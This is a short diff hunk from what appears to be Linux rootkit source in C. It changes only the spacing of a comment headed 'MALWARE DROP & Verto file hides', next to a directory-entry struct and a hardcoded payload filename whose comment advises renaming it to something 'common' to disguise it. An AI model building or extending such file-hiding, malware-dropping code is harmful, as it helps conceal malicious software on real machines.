@@ -60,7 +60,7 @@ struct linux_dirent {
 }*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer -> Utility pointers
 
 
-//      ------ MALWARE DROP & Verto file hides ------ //
+// ------ MALWARE DROP & Verto file hides ------ //
 
 //Hardcoded malware package
 char payload[]="malware_demo_file.py"; //Rename to something 'common'
